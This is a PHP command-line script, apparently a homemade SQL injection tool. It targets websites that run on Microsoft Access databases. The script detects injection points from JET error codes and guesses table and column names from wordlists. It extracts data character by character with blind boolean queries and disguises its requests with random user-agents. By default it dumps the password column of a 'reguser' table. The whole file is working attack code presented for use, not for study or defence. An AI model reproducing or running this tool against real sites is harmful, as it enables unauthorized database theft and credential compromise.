<?php
/**
 * Created by PhpStorm.
 * User: sincoder
 * Date: 13-12-15
 * Time: 下午12:41
 *
 * */
ini_set('memory_limit', -1);
@set_time_limit(0);
date_default_timezone_set("Asia/Shanghai");
 
class mycurl
{
    private $ch = null;
 
    private function reset()
    {
        if ($this->ch)
            curl_close($this->ch);
        $this->ch = curl_init();
        $header[] = "Connection: keep-alive";
        $header[] = "Keep-Alive: 300";
        $timeout = 30;
        curl_setopt($this->ch, CURLOPT_HTTPHEADER, $header); //设置 http  keep live 的字段
        curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 0);
        curl_setopt($this->ch, CURLOPT_TIMEOUT, $timeout);
    }
 
    private function exec_curl($url)
    {
        if (!$this->ch)
            $this->reset();
        $ua = array('Mozilla', 'Opera', 'Microsoft Internet Explorer', 'ia_archiver');
        $op = array('Windows', 'Windows XP', 'Linux', 'Windows NT', 'Windows 2000', 'OSX');
        $agent = $ua[rand(0, 3)] . '/' . rand(1, 8) . '.' . rand(0, 9) . ' (' . $op[rand(0, 5)] . ' ' . rand(1, 7) . '.' . rand(0, 9) . '; en-US;)';
        curl_setopt($this->ch, CURLOPT_URL, $url);
        curl_setopt($this->ch, CURLOPT_USERAGENT, $agent);
        $c = curl_exec($this->ch);
        if ($c) {
            return $c;
        }
        $this->reset();
        return false;
    }
 
    public function GetUrl($url)
    {
        while (1) {
            $c = $this->exec_curl($url);
            if ($c)
                return $c;
        }
    }
 
    public function GetHandle()
    {
        return $this->ch;
    }
}
 
if ($argc < 2) {
    echo 'Usage: Sqli.php [options] Url' . "\n";
    echo "options:\n";
    echo "\t-T table_name\n";
    echo "\t-C columns\n";
    echo "\t--tables\tGET tables\n";
    echo "\t--columns\tGET columns\n";
    echo "\t--dump\tDUMP DATA\n";
    exit;
}
 
$dbType = array(
    1 => 'access with error',
    2 => 'access bind',
    3 => 'mysql with error');
 
$g_url = $argv[1];
$g_curl = new mycurl();
$g_injectType = 'unknown';
$g_dbType = 1;
$g_unionCount = 0;
$g_keyWord = 'index';
 
echo GetInjectType();
 
if ($g_injectType == 'unknown') {
    echo "can not get inject type ,let me exit .. \n";
    exit;
}
echo "Inject Type is ${g_injectType} \n";
GetDataByColum('reguser', 'password');
//GetColumnDataById('reguser','password',1,7);
//GetColumnDataLen('reguser', 'password', 1);
//GuessTableName();
//GuessColumnName('reguser');
//GetDataCount('reguser');
 
function GetDataByColum($table, $column)
{
    global $g_curl;
    global $g_url;
    global $g_injectType;
    global $g_keyWord;
 
    //先获取数据的总数量
    $count = GetDataCount($table);
    if ($count == false || $count == 0) {
        echo "do not have any data \n";
        return false;
    }
    echo "total data count is ${count}\n";
    //先看看数据是不是空的
    for ($idx = 0; $idx < $count; $idx++) {
        if ($g_injectType == 'string') {
            //to do
        } else if ($g_injectType == 'num') {
            if ($idx == 0) {
                //第一次
                $url = $g_url . urlencode(" and (select top 1 [${column}] from [${table}] ) is null");
                $page = $g_curl->GetUrl($url);
                if (strstr($page, $g_keyWord)) // $page is true
                {
                    //is null
                    echo "<null>\n";
                } else {
                    //再来获取数据的长度
                    $len = GetColumnDataLen($table, $column, $idx + 1);
                    echo "${column} length ${len}\n";
                    echo GetColumnDataById($table, $column, $idx + 1, $len);
                }
            } else {
                $url = $g_url . urlencode(" and (select top " . ($idx + 1) . " [${column}] from [${table}] where [{$column}] not in (select top " . ($idx) . " from [${table}])) is null");
                $page = $g_curl->GetUrl($url);
                if (strstr($page, $g_keyWord)) // $page is true
                {
                    //is null
                    echo "<null>\n";
                } else {
                    //再来获取数据的长度
                    $len = GetColumnDataLen($table, $column, $idx + 1);
                    echo "${column} length ${len}\n";
                    echo GetColumnDataById($table, $column, $idx + 1, $len);
                }
            }
        }
    }
}
 
//得到一个表中第几行的第几列数据
function GetColumnDataById($table, $column, $id, $len)
{
    global $g_curl;
    global $g_url;
    global $g_injectType;
    global $g_keyWord;
 
    $data = '';
    if ($g_injectType == 'string') {
        //to do
    } else if ($g_injectType == 'num') {
        for ($i = 0; $i < $len; $i++) {
            if ($id == 1) {
                $max = 1;
                $min = 0;
                $minmax = $min;
                $value = 0;
                while ($max > $min) {
                    printf("%-30.30s\r","max : ${max} min: ${min}");
                    $url = $g_url . urlencode(" and (select top ${id} abs(asc(mid(cstr([${column}])," . ($i + 1) . ",1))) from [${table}])>${max} ");
                    $page = $g_curl->GetUrl($url);
                    if (strstr($page, $g_keyWord)) // $page is true
                    {
                        $min = $max;
                        $max = $max  * 2;
                    } else {
                        $url = $g_url . urlencode(" and (select top ${id} abs(asc(mid(cstr([${column}])," . ($i + 1) . ",1))) from [${table}])<${min} ");
                        $page = $g_curl->GetUrl($url);
                        if (strstr($page, $g_keyWord)) // $page is true
                        {
                            if ($min == 0) {
                                $value = 0;
                                break;
                            } else {
                                $max = $min;
                                $min = $minmax;//floor($min / 2);
                            }
                        } else {
                            $minmax = $min;
                            if ($max - $min == 1) {
                                $url = $g_url . urlencode(" and (select top ${id} abs(asc(mid(cstr([${column}])," . ($i + 1) . ",1))) from [${table}])=${min} ");
                                $page = $g_curl->GetUrl($url);
                                if (strstr($page, $g_keyWord)) // $page is true
                                {
                                    $value = $min;
                                    break;
                                } else {
                                    $value = $max;
                                    break;
                                }
                            } else {
                                $min = $min + ceil(($max - $min) / 2);
                            }
                        }
                    }
                }
                printf("%-30.30s\n","char at ${i} is " . (IsPrintAble($value) ? chr($value) : '\x' . bin2hex(chr($value))));
                $data .= chr($value);
            } else {
                $max = 1;
                $min = 0;
                $minmax = 0;
                $value = 0;
                while ($max > $min) {
                    printf("%-30.30s\r","max : ${max} min: ${min}");
                    $url = $g_url . urlencode(" and (select top ${id} abs(asc(mid(cstr([${column}])," . ($i + 1) . ",1))) from [${table}] where [${column}] not in (select top " . ($id - 1) . " [${column}] from [{$table}]))>${max} ");
                    $page = $g_curl->GetUrl($url);
                    if (strstr($page, $g_keyWord)) // $page is true
                    {
                        $min = $max;
                        $max = $max * 2;
                    } else {
                        $url = $g_url . urlencode(" and (select top ${id} abs(asc(mid(cstr([${column}])," . ($i + 1) . ",1))) from [${table}] where [${column}] not in (select top " . ($id - 1) . " [${column}] from [{$table}]))<${min} ");
                        $page = $g_curl->GetUrl($url);
                        if (strstr($page, $g_keyWord)) // $page is true
                        {
                            if ($min == 0) {
                                $value = 0;
                                break;
                            } else {
                                $max = $min;
                                $min = $minmax;//floor($min / 2);
                            }
                        } else {
                            $minmax = $min;
                            if ($max - $min == 1) {
                                $url = $g_url . urlencode(" and (select top ${id} abs(asc(mid(cstr([${column}])," . ($i + 1) . ",1))) from [${table}] where [${column}] not in (select top " . ($id - 1) . " [${column}] from [{$table}]))=${min} ");
                                $page = $g_curl->GetUrl($url);
                                if (strstr($page, $g_keyWord)) // $page is true
                                {
                                    $value = $min;
                                    break;
                                } else {
                                    $value = $max;
                                    break;
                                }
                            } else {
                                $min = $min + ceil(($max - $min) / 2);
                            }
                        }
                    }
                }
                printf("%-30.30s\n","char at ${i} is " . (IsPrintAble($value) ? chr($value) : '\x' . bin2hex(chr($value))));
                $data .= chr($value);
            }
        }
    }
    return $data;
}
 
function IsPrintAble($asc)
{
    return ($asc > 0x1F && $asc < 0x80);
}
 
//获取列数据的长度
function GetColumnDataLen($table, $column, $i)
{
    global $g_curl;
    global $g_url;
    global $g_injectType;
    global $g_keyWord;
 
    if ($g_injectType == 'string') {
        //to do
    } else if ($g_injectType == 'num') {
        if ($i == 1) {
            $max = 1;
            $min = 0;
            $value = 0;
            while ($max > $min) {
                printf("%-30.30s\r","max : ${max} min: ${min}");
                $url = $g_url . urlencode(" and (select top 1 len([${column}]) from [${table}])>${max} ");
                $page = $g_curl->GetUrl($url);
                if (strstr($page, $g_keyWord)) // $page is true
                {
                    $min = $max;
                    $max = $max * 2;
                } else {
                    $url = $g_url . urlencode(" and (select top 1 len([${column}]) from [${table}])<${min} ");
                    $page = $g_curl->GetUrl($url);
                    if (strstr($page, $g_keyWord)) // $page is true
                    {
                        if ($min == 0) {
                            $value = 0;
                            break;
                        } else {
                            //$tmp = $max;
                            $max = $min;
                            $min = floor($min / 2);
                        }
                    } else {
                        if ($max - $min == 1) {
                            $url = $g_url . urlencode(" and (select top 1 len([${column}]) from [${table}])=${min} ");
                            $page = $g_curl->GetUrl($url);
                            if (strstr($page, $g_keyWord)) // $page is true
                            {
                                $value = $min;
                                break;
                            } else {
                                $value = $max;
                                break;
                            }
                        } else {
                            $min = $min + ceil(($max - $min) / 2);
                        }
                    }
                }
            }
            return $value;
        } else {
            $max = 1;
            $min = 0;
            $value = 0;
            while ($max > $min) {
                printf("%-30.30s\r","max : ${max} min: ${min}");
                $url = $g_url . urlencode(" and (select top ${i} len([${column}]) from [${table}] where [${column}] not in (select top " . ($i - 1) . " [${column}] from [{$table}]))>${max} ");
                $page = $g_curl->GetUrl($url);
                if (strstr($page, $g_keyWord)) // $page is true
                {
                    $min = $max;
                    $max = $max * 2;
                } else {
                    $url = $g_url . urlencode(" and (select top ${i} len([${column}]) from [${table}] where [${column}] not in (select top " . ($i - 1) . " [${column}] from [{$table}]))<${min} ");
                    $page = $g_curl->GetUrl($url);
                    if (strstr($page, $g_keyWord)) // $page is true
                    {
                        if ($min == 0) {
                            $value = 0;
                            break;
                        } else {
                            $max = $min;
                            $min = floor($min / 2);
                        }
                    } else {
                        if ($max - $min == 1) {
                            $url = $g_url . urlencode(" and (select top ${i} len([${column}]) from [${table}] where [${column}] not in (select top " . ($i - 1) . " [${column}] from [{$table}]))=${min} ");
                            $page = $g_curl->GetUrl($url);
                            if (strstr($page, $g_keyWord)) // $page is true
                            {
                                $value = $min;
                                break;
                            } else {
                                $value = $max;
                                break;
                            }
                        } else {
                            $min = $min + ceil(($max - $min) / 2);
                        }
                    }
                }
            }
            return $value;
        }
    }
    return false;
}
 
//得到一哥表中数据的总数
function GetDataCount($table)
{
    global $g_curl;
    global $g_url;
    global $g_injectType;
    global $g_keyWord;
    if ($g_injectType == 'string') {
        //to do
    } else if ($g_injectType == 'num') {
        $max = 1;
        $min = 0;
        $minmax = $min;
        $value = 0;
        while ($max > $min) {
            printf("%-30.30s\r","max : ${max} min: ${min}");
            $url = $g_url . urlencode(" and (select count(*) from [${table}])>${max} ");
            $page = $g_curl->GetUrl($url);
            if (strstr($page, $g_keyWord)) // $page is true
            {
                $min = $max;
                $max = $max * 2;
            } else {
                $url = $g_url . urlencode(" and (select count(*) from [${table}])<${min} ");
                $page = $g_curl->GetUrl($url);
                if (strstr($page, $g_keyWord)) // $page is true
                {
                    if ($min == 0) {
                        $value = 0;
                        break;
                    } else {
                        $max = $min;
                        $min = $minmax;//floor($min / 2);
                    }
                } else {
                    $minmax = $min;
                    if ($max - $min == 1) {
                        // test if it equle min
                        $url = $g_url . urlencode(" and (select count(*) from [${table}])=${min} ");
                        $page = $g_curl->GetUrl($url);
                        if (strstr($page, $g_keyWord)) // $page is true
                        {
                            $value = $min;
                            break;
                        } else {
                            $value = $max;
                            break;
                        }
                    } else {
                        $min = $min + ceil(($max - $min) / 2);
                    }
                }
            }
        }
        return $value;
    }
    return false;
}
 
function GuessColumnName($table)
{
    global $g_curl;
    global $g_url;
    global $g_injectType;
    global $g_unionCount;
    if ($g_unionCount == 0) {
        FindUnionCount($table);
    }
    if ($g_unionCount == 0) {
        echo 'can not get union count !! \n';
        return false;
    }
    $dup = MakeDupString("NULL", ",", $g_unionCount);
    $columns = file_get_contents('column.txt');
    if (FALSE === $columns) {
        echo "can not open column.txt \n";
        return false;
    }
    $columns = str_replace("\r", "", $columns);
    $columns = explode("\n", $columns);
    foreach ($columns as $c) {
        printf("Test column %20.64s\r", $c);
        if ($g_injectType == 'string') {
            $url = $g_url . urlencode("' union select ${dup} from [${table}] where [${c}]='22222221");
            $page = $g_curl->GetUrl($url);
            $error = GetAccessError($page);
            if ($error) {
                if ($error == '80040e10') {
                    continue;
                }
            }
            echo "find column ${c}                    \n";
        }
    }
}
 
function GuessTableName() //80040e37
{
    global $g_curl;
    global $g_url;
    global $g_injectType;
    $tables = file_get_contents('table.txt');
    if (FALSE === $tables) {
        echo "can not open table txt \n";
        return false;
    }
    $tables = str_replace("\r", "", $tables);
    $tables = explode("\n", $tables);
    foreach ($tables as $t) {
        printf("Test Table %20.64s\r", $t);
        if ($g_injectType == 'string') {
            $url = $g_url . urlencode("' union select * from [${t}]  union select * from [sincoder] where '1111'='22222221");
            $page = $g_curl->GetUrl($url);
            $error = GetAccessError($page);
            if ($error) {
                if ($error == '80040e37') //表不存在
                {
                    if (strstr($page, "'sincoder'")) {
                        echo "find table ${t}                                     \n";
                    }
                }
            }
        }
    }
}
 
function  FindUnionCount($table)
{
    global $g_url;
    global $g_curl;
    global $g_injectType;
    global $g_unionCount;
    for ($i = 1; $i < 50; $i++) {
        printf("Test union count %10.10s\r", $i);
        if ($g_injectType == 'string') {
            $dup = MakeDupString("NULL", ",", $i);
            $url = $g_url . urlencode("' union select ${dup} from [${table}]  where [sincoder] < 0 and 'xxxss'='1");
            $page = $g_curl->GetUrl($url);
            $error = GetAccessError($page);
            if ($error == '80040e14') {
 
            } else if ($error == '80040e10') {
                echo "find union count ${i}\n";
                $g_unionCount = $i;
                return true;
            } else {
                echo "unknown error ${error} \n";
            }
        }
    }
    return false;
}
 
function GetInjectType()
{
    global $g_url;
    global $g_curl;
    global $g_injectType;
    $page = $g_curl->GetUrl($g_url . urlencode(' and 212<exists(select * from xsincoderx) '));
    $error = GetAccessError($page);
    if ($error) {
        echo "Get error code ${error}\n";
        $g_injectType = 'num';
    } else {
        $page = $g_curl->GetUrl($g_url . urlencode('\' and 212<exists(select * from xsincoderx) or \'ox\'=\'ox'));
        $error = GetAccessError($page);
        if ($error) {
            echo "Get error code ${error}\n";
            if ($error == '80040e37')
                $g_injectType = 'string';
            else {
                echo "unexcept error ${error} \n";
            }
        }
    }
}
 
function GetAccessError($page)
{
    if (stristr($page, "Microsoft JET Database Engine")) {
        preg_match_all('/\'800[0-9a-fA-F]{5}\'<\/font>/i', $page, $match);
        if (!empty($match[0][0])) {
            $error = $match[0][0];
            $error = trim($error);
            $error = str_replace("'", "", $error);
            $error = str_replace("</font>", "", $error);
            return $error;
        }
    }
    return false;
}
 
function MakeDupString($str, $deli, $count)
{
    $s = '';
    for ($i = 0; $i < $count - 1; $i++) {
        $s .= $str;
        $s .= $deli;
    }
    return $s . $str;
}